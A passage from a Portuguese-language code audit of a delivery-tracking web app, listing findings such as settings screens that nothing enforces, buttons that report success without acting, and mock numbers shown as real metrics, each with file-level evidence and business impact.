- **Impacto no negócio:** Um motorista sem avaliação aparece como nota máxima no ranking de Relatórios e como nota zero no de Analytics — e no primeiro caso sobe indevidamente na lista de melhores.
- **Evidência:**
  ```
  src/pages/reports/useReportData.ts:150; src/pages/reports/ReportDriversTab.tsx:37; src/hooks/useAnalyticsData.ts:89; src/pages/AnalyticsDashboardPage.tsx:117; supabase/migrations/20251224143803_3b1f0374-1b95-4fba-a31b-f44a9fd14494.sql:91 (DEFAULT 5.0, nullable, CHECK permite 0)
  ```
- **Causa raiz:** Dois defaults opostos para nota ausente: 5 (nota máxima) em Relatórios e 0 em Analytics.
- **Arquivos:** `src/pages/reports/useReportData.ts`, `src/pages/reports/ReportDriversTab.tsx`, `src/hooks/useAnalyticsData.ts`, `src/pages/AnalyticsDashboardPage.tsx`
- **Etapas do plano:** 269


## Causa raiz: Tela de configuração que não governa nada: o valor salvo não é lido por quem decide

Várias telas de ajuste foram construídas, salvam no banco e dão mensagem de sucesso, mas o motor que deveria obedecer lê outro lugar — ou não lê nada. Os minutos de aviso e de crítico do alerta de motorista parado não têm efeito, porque o limite real vem de um campo por pedido; desligar um tipo de alerta pode não desligar, porque existem várias linhas por tipo e o motor só olha uma; cinco dos oito campos oferecidos na tela de regras de risco não existem no avaliador, então a regra fica "Ativa" e nunca dispara; e as telas de lista de endereços permitidos e de bloqueio por país não são consultadas por nenhum código, inclusive no login. O dono acredita estar controlando o sistema por essas telas.

**7 achado(s) sob esta causa.**


#### A-018 — Duas telas gravam alert_configurations com canais diferentes e o motor de alertas usa só o alert_type — desligar alerta pode não ter efeito

- **Camada:** Interface — administração
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Um gerente desliga 'Motorista Parado' em Configurações, a tela confirma 'salvo com sucesso', e os alertas continuam disparando (ou o contrário: o alerta fica desligado sem ninguém ter pedido). Os minutos de tolerância configurados podem ser ignorados e o sistema usar 5/10/15 de fábrica.
- **Evidência:**
  ```
  supabase/functions/check-driver-alerts/index.ts:71-73 `(configsData || []).forEach((c: AlertConfig) => { configs[c.alert_type] = c; });`; src/hooks/useAlertSettings.ts:34-36 `.from('alert_configurations').select('*')` (leitura sem canal); src/pages/AlertConfigurationsPage.tsx:72 `channel: 'email',`; migration 20251224143803_...sql:265 `UNIQUE(alert_type, channel)`
  ```
- **Causa raiz:** A tabela tem chave única (alert_type, channel), então existem múltiplas linhas por tipo de alerta. O motor sobrescreve a entrada do mapa a cada linha, ficando com a última que o Postgres devolveu (ordem não garantida). O mesmo acontece na leitura da tela: useAlertSettings.ts:35 faz `.from('alert_configurations').select('*')` sem filtrar canal, então o toggle exibido pode vir de uma linha diferente daquela que o botão Salvar escreve.
- **Arquivos:** `src/hooks/useAlertSettings.ts`, `src/pages/SettingsPage.tsx`, `src/pages/AlertConfigurationsPage.tsx`, `supabase/functions/check-driver-alerts/index.ts`
- **Etapas do plano:** 033

#### A-040 — Regras de risco: 5 dos 8 campos oferecidos na tela não existem no avaliador — a regra é salva como Ativa e nunca dispara

- **Camada:** Interface — administração
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** O gestor cria uma regra de risco (por exemplo 'taxa de conclusão abaixo de 80% soma 3 pontos'), a tela confirma 'Regra criada com sucesso' e mostra a regra como Ativa, mas ela nunca pesa na avaliação dos motoristas. O score de risco continua ignorando o critério que o negócio definiu.
- **Evidência:**
  ```
  src/pages/RiskRulesPage.tsx:31-39; src/pages/RiskRulesPage.dialogs.tsx:12-20; supabase/functions/evaluate-driver/index.ts:425-456 (default: return false); supabase/migrations/20251224181603_...:121 (regra ativa semeada com completion_rate)
  ```
- **Causa raiz:** As listas de campos da UI e o `switch` do `evaluateCondition` na edge foram escritas separadamente e divergiram. Só `total_deliveries`, `rating` e `incident_count` existem nos dois lados; os cinco restantes caem no `default: return false`, ou seja, a condição nunca é verdadeira.
- **Arquivos:** `src/pages/RiskRulesPage.tsx`, `src/pages/RiskRulesPage.dialogs.tsx`, `supabase/functions/evaluate-driver/index.ts`
- **Etapas do plano:** 079

#### A-049 — Minutos de aviso e de crítico configurados em /alert-configurations não têm efeito nenhum no alerta de motorista parado

- **Camada:** Regras de negócio — cálculos
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O operador ajusta "avisar quando o motorista ficar parado X minutos", a tela salva e mostra o valor salvo, e o sistema continua avisando aos 5 minutos — alerta demais ou de menos sem ninguém entender por quê.
- **Evidência:**
  ```
  supabase/functions/check-driver-alerts/index.ts:143-144 "const warningThreshold = order.stalled_threshold_minutes || DEFAULT_STOPPED_WARNING_MINUTES;" / "const criticalThreshold = warningThreshold * 2;"; :21-22 "const DEFAULT_STOPPED_WARNING_MINUTES = 5;" / "const DEFAULT_STOPPED_CRITICAL_MINUTES = 10;"; :60-62 select sem .eq('channel', ...); src/hooks/useAlertSettings.ts:76-83 grava config com warning_minutes/critical_minutes no channel 'in_app'.
  ```
- **Causa raiz:** A configuração é lida (`configs['DRIVER_STOPPED']`, index.ts:76) só para saber se o alerta está ligado; o limiar efetivo vem do campo por pedido `lalamove_orders.stalled_threshold_minutes` ou da constante 5, e o crítico é sempre o dobro do aviso.
- **Arquivos:** `supabase/functions/check-driver-alerts/index.ts`, `src/hooks/useAlertSettings.ts`, `src/pages/alert-configurations/AlertConfigCard.tsx`
- **Etapas do plano:** 088

#### A-058 — IP Whitelist e Bloqueio Geográfico são telas de segurança que nenhum código aplica

- **Camada:** Interface — administração
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** O dono acha que restringiu o acesso ao sistema a IPs e países específicos; na prática qualquer pessoa de qualquer país e qualquer IP continua entrando normalmente. É falsa sensação de segurança em duas telas de admin.
- **Evidência:**
  ```
  src/pages/GeoBlockingPage.tsx:296-299 "Apenas usuários de países na whitelist podem acessar o sistema... Esta configuração é aplicada globalmente a todos os usuários."; supabase/migrations/20260711184140_78845ae2-2e63-4f1a-a1bc-c8a1bb09f674.sql:8-10 GRANT das funções para service_role; nenhum arquivo em supabase/functions/ cita is_country_blocked/is_ip_whitelisted
  ```
- **Causa raiz:** As funções de banco `is_ip_whitelisted(inet)` e `is_country_blocked(text)` existem e têm GRANT para service_role (supabase/migrations/20260711184140_78845ae2-2e63-4f1a-a1bc-c8a1bb09f674.sql:6-10), mas nenhuma edge function, policy RLS ou middleware do repo as chama. Não há vercel.json nem middleware.ts com regra de país/IP. A configuração é gravada e nunca consultada em nenhum caminho de autenticação ou request.
- **Arquivos:** `src/pages/GeoBlockingPage.tsx`, `src/pages/IPWhitelistPage.tsx`, `src/hooks/useRateLimiting.ts`
- **Etapas do plano:** 143

#### M-044 — Bloqueio e limite por IP no login nunca são acionados — o front sempre envia o IP como indefinido

- **Camada:** Regras de negócio — cálculos
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Quem testa senhas variando o e-mail nunca é barrado: o único freio que funciona é por e-mail. A lista de IPs bloqueados também nunca é alimentada pelo login, então a tela de rate limiting mostra uma proteção que não está acontecendo.
- **Evidência:**
  ```
  src/hooks/useLoginLockout.ts:21-24 — "const { data, error } = await supabase.rpc('check_login_lockout_v2', {\n        p_email: email,\n        p_ip_address: undefined,\n      });" e :49-53 — "p_ip_address: undefined, // IP capturado server-side quando disponível". Bloco morto: supabase/migrations/20260109204414_4f9e55d1-a4a0-41ad-b2c3-e7bc13f39347.sql:50 "IF p_ip_address IS NOT NULL THEN", :74 "IF v_ip_attempts >= 20 THEN", :145-148 "SELECT COUNT(DISTINCT email) > 5 INTO v_is_suspicious".
  ```
- **Causa raiz:** As RPCs v2 foram escritas para receber o IP, mas o front (único chamador) não tem como obtê-lo e passa undefined; nenhuma edge faz esse papel. O comentário no próprio código reconhece que o IP viria "server-side quando disponível" — e esse lado nunca foi feito.
- **Arquivos:** `src/hooks/useLoginLockout.ts`, `supabase/migrations/20260109204414_4f9e55d1-a4a0-41ad-b2c3-e7bc13f39347.sql`, `src/hooks/useRateLimiting.ts`
- **Etapas do plano:** 123

#### M-072 — Aba Acessibilidade das preferências não aplica nem salva nada

- **Camada:** Interface — administração
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** Quem precisa de alto contraste, texto maior ou menos animação liga as opções, vê o botão mudar de posição e nada acontece; ao recarregar a página as opções voltam a desligadas. A promessa de acessibilidade do sistema não existe.
- **Evidência:**
  ```
  src/pages/UserPreferencesPage.tsx:46-51 (estado local) e switches em :332, :343, :354, :377 — o auditor citou :342/:352/:389, as linhas corretas são 343/354/377. handleResetAll em :58-69 (o auditor disse :59-69).
  ```
- **Causa raiz:** A aba foi construída como estado local puro. Nenhum outro arquivo do projeto conhece essas chaves — `grep -rn "highContrast\|largerText\|focusIndicators\|reducedMotion" src/` só encontra ocorrências dentro desta própria página.
- **Arquivos:** `src/pages/UserPreferencesPage.tsx`
- **Etapas do plano:** 154

#### M-074 — Provedor reserva (fallback) do mapa é só exibido, nunca configurável

- **Camada:** Interface — administração
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** O administrador lê que existe um provedor reserva para quando o mapa principal falhar, mas não consegue escolher qual é. Quem quiser mudar depende de alterar o banco direto.
- **Evidência:**
  ```
  src/pages/MapsSettingsPage.tsx:679-681 — `<TableCell className="text-sm text-muted-foreground">{providerLabel(current?.fallback ?? null)}</TableCell>`; :215 `fallback_provider: value === 'off' ? null : ((current?.fallback as GeoSettingProvider | null) ?? null),`. Consumo real em supabase/functions/geo-gateway/resolver.ts:111 `const fallback = row?.fallback_provider ?? null;` e :143 `const declared = row?.fallback_provider;`.
  ```
- **Causa raiz:** A matriz de funções recebeu seletor para o provedor principal, mas o da reserva ficou como leitura. Não há nenhum caminho na interface para definir, trocar ou remover o fallback de uma função.
- **Arquivos:** `src/pages/MapsSettingsPage.tsx`
- **Etapas do plano:** 156


## Causa raiz: Botão que confirma sucesso sem executar a ação

Elementos de interface foram entregues sem a ação por trás, e alguns ainda avisam que deu certo. Os botões de processar e apagar item da fila são apenas rascunhos, mas a tela mostra mensagem de sucesso; o botão de exportar a lista de pedidos não tem nada ligado nele, embora a capacidade exista no projeto; os formulários de credencial da Lalamove nunca conseguem salvar porque o serviço por trás foi removido; o acesso por biometria nunca loga ninguém; os botões do balão do motorista no mapa não respondem porque foram ligados antes de existirem na tela; e renomear um dispositivo grava um nome automático sem perguntar nada. O operador acredita ter feito algo que não aconteceu.

**6 achado(s) sob esta causa.**


#### A-010 — Botão "Entrar com Biometria" nunca loga ninguém: o challenge é inserido como anônimo e a RLS recusa

- **Camada:** Hooks e estado — auth, permissão e infra
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** A opção de entrar por biometria/digital que aparece na tela de login está morta: quem clica recebe erro e precisa usar e-mail e senha. A empresa anuncia um recurso de segurança que não existe.
- **Evidência:**
  ```
  src/hooks/useWebAuthn.ts:223-231 (insert sem user_id) + src/hooks/useWebAuthn.ts:286-290 `return { userId: passkey.user_id, credentialId, success: true };` + supabase/migrations/20260108144200_f760b5fc-115e-4968-850b-f169eb73680a.sql:105-107 + src/pages/AuthPage.tsx:271
  ```
- **Causa raiz:** O fluxo de passkey foi escrito como se houvesse um verificador server-side, mas não há: o cliente grava o challenge direto na tabela (sem `user_id`, e sem sessão para `auth.uid()`), lê `user_passkeys` (cujo SELECT é `TO authenticated USING (auth.uid() = user_id)`, migration 20260315204059:10) e devolve `{ success: true }` sem nunca verificar assinatura nem criar sessão Supabase. Na prática a mutation estoura no primeiro insert; e mesmo se passasse, nenhuma sessão seria criada porque `AuthPage` não passa `onSuccess`.
- **Arquivos:** `src/hooks/useWebAuthn.ts`, `src/components/auth/PasskeyLoginButton.tsx`, `src/pages/AuthPage.tsx`, `supabase/migrations/20260108144200_f760b5fc-115e-4968-850b-f169eb73680a.sql`
- **Etapas do plano:** 025

#### A-019 — Formulários de credencial da Lalamove (token UAPI e chaves V3) nunca conseguem salvar — o gateway devolve 501

- **Camada:** Interface — administração
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Quando o token da Lalamove expira (a cada ~24h), o gerente abre a tela de configurações, cola o token novo, clica em Atualizar e recebe um erro sem explicação. A operação fica sem cotação/pedido até alguém trocar o segredo pelo painel do Supabase — e a tela não diz isso em lugar nenhum.
- **Evidência:**
  ```
  supabase/functions/lalamove-gateway/route.ts:131-140 `case 'update_uapi_token': case 'update_token': case 'update_v3_keys': return { unsupported: true, reason: 'Credenciais não são gravadas por requisição...' }`; index.ts:288 `return json({ error: routed.reason, action, requestId }, 501, requestId);` — alcançado apenas no ramo sem proxy externo (index.ts:275 `if (baseUrl && proxyKey)`)
  ```
- **Causa raiz:** O proxy externo foi removido (comentário em lalamove-gateway/index.ts:270: 'quando os secrets não estão definidos (é o caso da produção), a ação é atendida pelas edges locais') e as ações de escrita de credencial foram marcadas como não suportadas, mas as três telas que oferecem esses formulários continuaram no ar. O erro 501 cai no `catch` genérico das páginas e aparece como 'Erro ao atualizar token' / 'Erro ao atualizar credenciais V3', sem dizer que o caminho não existe mais.
- **Arquivos:** `src/pages/LalamoveSettingsPage.tsx`, `src/pages/UAPISettingsPage.tsx`, `src/lib/lalamove-api.ts`, `src/lib/uapi-proxy.ts`, `supabase/functions/lalamove-gateway/route.ts`
- **Etapas do plano:** 034

#### A-038 — Botões 'Trajeto' e 'Google' do popup do motorista não fazem nada em produção (listener nunca é anexado)

- **Camada:** Interface — mapa e rastreamento
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** No mapa ao vivo, clicar em 'Trajeto' ou 'Google' no balão do motorista não abre nada: o histórico de trajeto e o atalho para o Google Maps simplesmente não funcionam, e a equipe não tem como revisar o caminho percorrido por quem está em rota.
- **Evidência:**
  ```
  src/components/map/markerFactories.ts:325-327 `const root = popup.getElement();` / `if (!root) return popup;` / `const historyBtn = root.querySelector...` · node_modules/mapbox-gl/dist/mapbox-gl-dev.js:114946 `getElement() {` + :115189 `if (!map || !hasPosition || !content) { return; }` · src/components/map/hooks/useMapMarkers.ts:193 `.setPopup(createDriverPopup(tracking))`
  ```
- **Causa raiz:** `createDriverPopup` chama `popup.getElement()` logo depois de `new mapboxgl.Popup()` + `setHTML()`, antes de o popup entrar no mapa. No mapbox-gl, `getElement()` devolve `_container`, que só é criado quando o popup é adicionado a um mapa; antes disso é `undefined`. Logo a função cai no `if (!root) return popup;` e os dois `addEventListener` (linhas 328 e 335) nunca rodam. Não existe listener delegado em nenhum outro ponto (verificado: só markerFactories.ts dispara 'show-driver-history' e LiveMap.tsx:343 escuta).
- **Arquivos:** `src/components/map/markerFactories.ts`, `src/components/map/LiveMap.tsx`, `src/components/map/__tests__/markerFactories.test.ts`
- **Etapas do plano:** 077

#### M-098 — Botao 'Exportar' da tela de pedidos nao tem handler nenhum

- **Camada:** Interface — fluxo de pedido
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Quem precisa levar a lista de pedidos para planilha clica e nao acontece nada — sem erro, sem aviso. Vira retrabalho manual ou pedido de relatorio para outra pessoa.
- **Evidência:**
  ```
  src/pages/OrdersPage.tsx:159 `<Button variant="outline" size="sm" className="bg-secondary/50 h-9 sm:h-10 px-2.5 sm:px-4"><Download className="w-4 h-4 sm:mr-2" /><span className="hidden sm:inline">Exportar</span></Button>` (sem onClick) | src/utils/exportUtils.ts:22,57
  ```
- **Causa raiz:** Botao entregue sem acao. A capacidade existe no projeto (src/utils/exportUtils.ts, usada em src/components/lalamove/UapiStatementPanel.tsx:9 `import { exportToCSV, exportToExcel } from '@/utils/exportUtils';`), so nao foi ligada aqui.
- **Arquivos:** `src/pages/OrdersPage.tsx`, `src/utils/exportUtils.ts`, `src/components/lalamove/UapiStatementPanel.tsx`
- **Etapas do plano:** 193

#### M-121 — Botão de renomear dispositivo não pergunta o nome: grava um rótulo automático

- **Camada:** Interface — administração
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** O usuário clica para dar um apelido ao próprio aparelho ('Notebook da operação') e o sistema grava 'Windows (Chrome)' sem perguntar nada — e o botão fica desabilitado em momentos errados.
- **Evidência:**
  ```
  src/pages/ProfilePage.tsx:374-381 (onClick com nome derivado de os/browser, disabled={isRemoving}); src/hooks/useUserDevices.ts:76-98 e :100-105 (rename grava device_name; retorno sem flag de pendência do rename)
  ```
- **Causa raiz:** O botão com ícone de lápis chama a mutation direto com um nome derivado do sistema operacional e navegador; não há campo de texto, diálogo nem prompt. O `disabled` ainda usa `isRemoving`, flag da ação de remover, não da de renomear.
- **Arquivos:** `src/pages/ProfilePage.tsx`
- **Etapas do plano:** 245

#### B-029 — Trocar a velocidade do replay de trajeto não tem efeito enquanto a reprodução está rodando

- **Camada:** Interface — mapa e rastreamento
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Ao revisar o trajeto de uma entrega, os botões de velocidade parecem travados: a reprodução não acelera nem desacelera até o usuário pausar e recomeçar.
- **Evidência:**
  ```
  src/components/map/MapHistoryPanel.tsx:40 `      }, playbackSpeed);` · :42 `    return () => clearInterval(interval);` · :43 `  }, [playbackActive, history, onPlaybackUpdate]);` · :201 `                        onClick={() => setPlaybackSpeed(speed)}`
  ```
- **Causa raiz:** `playbackSpeed` é usado no `setInterval` mas não está nas dependências do efeito, então mudar a velocidade não recria o timer: o intervalo continua com o valor vigente quando o play foi acionado, até pausar e dar play de novo.
- **Arquivos:** `src/components/map/MapHistoryPanel.tsx`
- **Etapas do plano:** 211


## Causa raiz: Valor de maquete deixado no código e apresentado como medição real

Telas foram montadas primeiro com números de exemplo, para mostrar como ficariam, e esses números nunca foram trocados por medição — mas continuam com o rótulo de dado real. É o caso da variação percentual "vs período anterior" do painel de analytics, do tempo de disponibilidade e das conexões de banco na tela de saúde, do percentual de cumprimento de prazo da análise preditiva, das zonas de risco desenhadas no mapa como se fossem informação operacional, da aba de permissões que mostra tudo como concedido, do aviso fixo de segredos pendentes e da coluna de tempo médio que sai sempre zerada no relatório exportado. Quem lê não tem como distinguir maquete de medição.

**8 achado(s) sob esta causa.**


#### A-043 — Página "Fila de Jobs" não lê a tabela job_queue real; "Processando" e "Tempo Médio" são constantes

- **Camada:** Interface — painéis e relatórios
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** A tela que deveria avisar que notificações, sincronizações e buscas de POD estão travadas mostra números de outra coisa: jobs realmente parados ou falhando ficam invisíveis, e o campo "Processando" nunca sai de zero.
- **Evidência:**
  ```
  src/hooks/useJobQueue.ts:103 `totalProcessing: 0, // Não temos como saber o que está em processamento`; :106 `avgProcessingTimeSeconds: 2, // Estimativa`; :1 `// Job Queue Hook - Simula fila de jobs usando dados reais das tabelas existentes`; supabase/migrations/20261122120200_job_queue_system.sql:17-21 `CREATE TABLE IF NOT EXISTS public.job_queue (... status text NOT NULL DEFAULT 'PENDING' CHECK (status IN ('PENDING','PROCESSING','COMPLETED','FAILED','CANCELLED'))`
  ```
- **Causa raiz:** A fila real existe no banco (job_queue + RPCs mark_job_processing/mark_job_failed/get_next_jobs, usadas pelo job-worker) mas a UI foi escrita sobre proxies (webhook_events, driver_evaluations, bitrix24_sync). Nenhum arquivo de src/ consulta job_queue (`grep -rn "job_queue" src/` só retorna types.ts).
- **Arquivos:** `src/hooks/useJobQueue.ts`, `src/pages/JobQueuePage.tsx`, `supabase/migrations/20261122120200_job_queue_system.sql`, `supabase/migrations/20261123160000_job_queue_processing_log.sql`
- **Etapas do plano:** 082

#### A-059 — Dashboard de Analytics mostra variação percentual inventada (+12%, +8%, -3%, -15%) como "vs período anterior"

- **Camada:** Interface — painéis e relatórios
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** A página chamada "Métricas reais do sistema" mostra que pedidos subiram 12% e alertas caíram 15% todos os dias, inclusive quando caíram pela metade. Decisão de negócio tomada sobre número fictício.
- **Evidência:**
  ```
  src/pages/AnalyticsDashboardPage.tsx:78-81 — `{ label: 'Total de Pedidos', value: totals.pedidos, icon: Package, color: 'primary', change: 12 },` ... `{ label: 'Alertas', value: totals.alertas, icon: AlertTriangle, color: 'warning', change: -15 },`; src/pages/AnalyticsDashboardPage.tsx:84 — `<span>{Math.abs(stat.change)}% vs período anterior</span>`; src/hooks/useAnalyticsData.ts:79 — `{ metric: 'Tempo médio de entrega', value: \`${avgDeliveryMins}min\`, change: avgDeliveryMins > 0 ? -5 : 0, trend: 'down' as const },`
  ```
- **Causa raiz:** Valores de maquete deixados no código. O hook já busca a janela anterior (useAnalyticsData.ts:33-35) e tem `calcChange` (linha 65), mas os quatro cards de topo não o usam, e "Tempo médio" usa -5 fixo.
- **Arquivos:** `src/pages/AnalyticsDashboardPage.tsx`, `src/hooks/useAnalyticsData.ts`
- **Etapas do plano:** 144

#### M-042 — Análise preditiva mostra percentual de SLA inventado e nunca encontra motoristas em risco

- **Camada:** Regras de negócio — cálculos
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** A tela de análise preditiva informa um número de cumprimento de SLA que não veio de nenhuma entrega, e nunca avisa sobre concentração de motoristas de risco por mais graves que sejam — é um painel que tranquiliza sem base.
- **Evidência:**
  ```
  src/hooks/usePredictiveAnalysis.ts:32 — `supabase.from("drivers").select("id, risk_score, risk_level, failure_rate").or("risk_level.eq.high,risk_level.eq.critical")`; supabase/functions/evaluate-driver/index.ts:737 — `risk_level: result.riskLevel,` (valores em index.ts:269-273: 'CRITICAL'/'HIGH'/'MEDIUM'/'LOW'); src/hooks/useApprovalActions.ts:98 — `risk_level: 'CRITICAL'`; usePredictiveAnalysis.ts:68 — `slaCompliance: avgDelay < 15 ? 95 : avgDelay < 30 ? 85 : 70,`
  ```
- **Causa raiz:** O "compliance" não é calculado, é uma escada de três valores fixos sobre um atraso médio que, em pedidos em andamento, costuma ser zero; e o filtro de risco compara o enum em caixa diferente da gravada.
- **Arquivos:** `src/hooks/usePredictiveAnalysis.ts`, `src/components/alerts/PredictiveAlerts.tsx`
- **Etapas do plano:** 121

#### M-067 — Painel de saúde do sistema mostra números inventados e mina um token Mapbox a cada 30 segundos

- **Camada:** Hooks e estado — auth, permissão e infra (+ 2 outro(s) local)
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O painel que o dono usaria para saber se o sistema está de pé informa disponibilidade de 99,9% e 15 conexões sempre, independentemente da realidade — ou seja, não serve para detectar incidente. E cada aba aberta nessa tela pede o token do mapa a cada meio minuto sem precisar dele.
- **Evidência:**
  ```
  src/hooks/useSystemHealth.ts:41-44 — `frontendUptime: '99.9%', dbConnections: 15, fnLatency, realtimeConnections: channels.length`; src/pages/SystemHealthPage.tsx:27 — `Uptime: {health?.frontendUptime}`; :41 — `Connections: {health?.dbConnections}/100`; supabase/functions/_shared/schemas.ts:322-323 — `// get-mapbox-token — devolve o token; \`healthCheck\` é o único campo que algum chamador envia hoje (src/hooks/healthChecks.ts:49) e a edge não o lê.`
  ```
  Mesma causa, outro local — Interface — painéis e relatórios:
  ```
  src/hooks/useSystemHealth.ts:28-30 + :46 (`refetchInterval: 30000`); src/hooks/healthChecks.ts:49; supabase/functions/get-mapbox-token/index.ts:48-51; proteções não vistas: supabase/config.toml:6-7 (`verify_jwt = true`), src/App.tsx:169-170 (`requiredRole="manager"`), supabase/functions/_shared/schemas.ts:324-326 (`healthCheck: z.boolean().optional()`)
  ```
  Mesma causa, outro local — Interface — painéis e relatórios:
  ```
  src/hooks/useSystemHealth.ts:41-42 `frontendUptime: '99.9%',` / `dbConnections: 15,`; src/pages/SystemHealthPage.tsx:27 `Uptime: {health?.frontendUptime}`; src/pages/SystemHealthPage.tsx:41 `Connections: {health?.dbConnections}/100`
  ```
- **Causa raiz:** O hook mistura três coisas: medidas reais (latência da função, erro do banco), valores de maquete que nunca foram substituídos, e um "ping" implementado em cima do endpoint que entrega a credencial do Mapbox. Além disso `realtime` é inferido de `supabase.getChannels()` — estado do próprio navegador, não do serviço.
- **Arquivos:** `src/hooks/healthChecks.ts`, `src/hooks/useSystemHealth.ts`, `src/pages/SystemHealthPage.tsx`, `supabase/functions/get-mapbox-token/index.ts`
- **Etapas do plano:** 149

#### M-071 — Zonas de risco do mapa são polígonos fixos escritos no código, apresentados como informação operacional

- **Camada:** Interface — mapa e rastreamento
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** O mapa marca duas áreas como 'alto risco' e 'atenção' que não vêm de nenhuma análise: a equipe pode tomar decisão de rota confiando em desenho de exemplo, e áreas realmente problemáticas não aparecem.
- **Evidência:**
  ```
  src/components/map/mapLayers.ts:25 `properties: { severity: 'high', name: 'Área de Alto Risco - Zona Sul' },` e :39 `properties: { severity: 'medium', name: 'Área de Atenção - Zona Norte' },` (source criada em :18 `map.addSource('risk-zones', {`); nenhum `setData` para essa source em todo o src/
  ```
- **Causa raiz:** `setupMapLayers` cria a source 'risk-zones' com duas features GeoJSON hardcoded em coordenadas fixas de São Paulo e desenha as camadas 'risk-zones-fill'/'risk-zones-outline' (linhas 55-80). Busca em todo o src/ mostra que nenhum código faz `setData` dessa source: as únicas outras referências são os testes (src/components/map/__tests__/mapLayers.test.ts:31,39-40,59) e o posicionamento do overlay raster (mapLayers.ts:306). Ou seja, o dado nunca é substituído por regra real — e o repo tem página de regras de risco própria (/risk-rules em src/App.tsx), desconectada daqui.
- **Arquivos:** `src/components/map/mapLayers.ts`, `src/components/map/__tests__/mapLayers.test.ts`
- **Etapas do plano:** 153

#### M-073 — Banner 'Secrets de notificação pendentes' é fixo no código e o botão Configurar não faz nada

- **Camada:** Interface — administração
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** O gerente vê um alerta permanente de pendência que pode já estar resolvida, clica em 'Configurar' e nada acontece. Ou o inverso: confia que está tudo certo porque o aviso é 'sempre assim' e deixa de notar que as notificações realmente não estão ativas.
- **Evidência:**
  ```
  src/pages/AlertConfigurationsPage.tsx:119 (cartão sem condicional) e :126 `<Button variant="warning" size="sm">Configurar</Button>`; supabase/functions/check-external-api/index.ts:47-75 (serviços suportados); src/pages/MapsSettingsPage.tsx:333 (padrão `Button ... asChild`).
  ```
- **Causa raiz:** Aviso estático escrito à mão, com um botão decorativo. A página não consulta o estado real dos segredos (EVOLUTION_API_KEY, RESEND_API_KEY, SLACK_WEBHOOK_URL) em nenhum lugar, então o alerta aparece mesmo quando tudo já está configurado, e o único caminho de ação oferecido é morto.
- **Arquivos:** `src/pages/AlertConfigurationsPage.tsx`
- **Etapas do plano:** 155

#### M-127 — CSV de Relatórios traz a coluna "Tempo Médio (min)" sempre zerada

- **Camada:** Interface — painéis e relatórios
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** Quem abre o relatório exportado conclui que o tempo médio diário de entrega é zero em todos os dias do período.
- **Evidência:**
  ```
  src/pages/reports/useReportData.ts:33 (campo), :120 (init 0), :121-130 (laço não preenche), :131 (setDailyStats); src/pages/ReportsPage.tsx:80 (CSV) e :84 (JSON, mesmo defeito)
  ```
- **Causa raiz:** O campo `avgTime` de DailyStats é inicializado em 0 e nunca preenchido; só o CSV o consome.
- **Arquivos:** `src/pages/reports/useReportData.ts`, `src/pages/ReportsPage.tsx`
- **Etapas do plano:** 251

#### M-147 — Aba 'Permissões' da tela de Roles mostra todas as permissões como concedidas para qualquer papel

- **Camada:** Interface — administração
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Ao conferir o que um Visualizador pode fazer, a tela mostra que ele tem TODAS as permissões do sistema, inclusive as de administrador. Quem usa essa tela para auditar acesso recebe informação errada sobre segurança.
- **Evidência:**
  ```
  src/pages/RolesPage.tsx:107-111 (filtro que sempre retorna true) e :264-277 (Check fixo); dado correto disponível em src/hooks/usePermissions.ts:86-95 e padrão já implementado em src/pages/PermissionsPage.tsx:58-64.
  ```
- **Causa raiz:** O filtro por papel nunca foi implementado (o comentário admite isso). A lista exibida é `allPermissions` inteira, com ícone de concedido fixo, independentemente do papel selecionado e do conteúdo de role_permissions.
